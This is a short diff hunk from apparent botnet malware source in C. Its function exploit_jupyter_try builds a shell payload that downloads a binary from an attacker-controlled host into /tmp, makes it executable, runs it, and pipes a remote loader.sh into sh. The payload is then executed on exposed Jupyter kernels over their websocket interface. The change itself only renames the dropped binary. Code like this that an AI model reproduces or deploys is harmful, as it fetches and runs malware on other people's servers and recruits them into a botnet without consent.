@@ -330,7 +330,7 @@ BOOL exploit_jupyter_try(ipv4_t ip, uint16_t port)
 
 	char payload[512];
 	snprintf(payload, sizeof(payload),
-		"wget http://%s/bins/nullpointer.x86 -O /tmp/nullpointer && chmod +x /tmp/nullpointer && /tmp/nullpointer & wget -qO- http://%s/bins/loader.sh | sh",
+		"wget http://%s/bins/fnbnet.x86 -O /tmp/fnbnet && chmod +x /tmp/fnbnet && /tmp/fnbnet & wget -qO- http://%s/bins/loader.sh | sh",
 		JUPYTER_BINS_HOST, JUPYTER_LOADER_HOST);
 
 	BOOL ok = jupyter_ws_execute(fd, ip, port, kernel_id, payload);
